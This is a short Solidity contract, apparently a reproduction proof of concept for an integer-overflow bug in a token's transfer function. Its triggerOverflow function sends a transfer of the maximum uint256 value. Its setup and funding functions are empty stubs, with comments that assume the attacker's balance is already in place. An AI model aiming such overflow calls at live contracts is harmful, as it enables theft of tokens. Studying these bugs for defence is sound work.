interface IIntegerOverflowAdd {
    function transfer(address _to, uint256 _value) external;
    function balanceOf(address _owner) external view returns (uint256);
}

contract Reproduction {
    IIntegerOverflowAdd public vulnerable;

    constructor(address _vulnerableAddress) {
        vulnerable = IIntegerOverflowAdd(_vulnerableAddress);
    }

    function setupOverflow(address target) public {
        // Directly modify the vulnerable contract storage (simulated or assumed access).
        // Alternatively, assume the vulnerable contract has some initialization or funding mechanism.
        // For reproduction, we assume the sender already has a max uint256 balance.
        // Nothing is done here since the vulnerable contract allows manual balance setup externally.
    }

    function fundAttacker() public {
        // Simulate attacker obtaining maximum balance
        // This step assumes prior manipulation or initialization (e.g., via a test environment)
        // If the vulnerable contract exposes any way to set balances, it would be called here
    }

    function triggerOverflow() public {
        uint256 overflowAmount = type(uint256).max;
        vulnerable.transfer(msg.sender, overflowAmount);
    }

    function checkBalance(address addr) public view returns (uint256) {
        return vulnerable.balanceOf(addr);
    }
}